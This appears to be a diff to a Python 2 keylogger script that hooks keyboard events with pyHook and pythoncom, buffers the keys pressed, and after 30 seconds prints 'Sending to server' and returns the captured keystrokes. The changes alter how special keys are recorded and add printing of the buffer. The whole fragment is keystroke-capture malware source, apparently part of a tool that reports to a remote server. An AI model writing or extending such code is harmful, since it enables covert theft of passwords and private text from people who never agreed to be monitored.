@@ -74,7 +74,7 @@ def KeyStroke(event):
             
         else:
             print "[%s]" %event.Key
-            key_buffer.append(chr(event.Key))
+            key_buffer.append("[%s]" %event.Key)
            
    
                 
@@ -91,7 +91,8 @@ def run():
     k1.HookKeyboard()
     while True:
         if time.clock()-start_time >30:
-            print"Sending to server"                
+            print"Sending to server"
+            print "%s" %''.join(key_buffer)
             return ''.join(key_buffer)   
         pythoncom.PumpWaitingMessages()
     
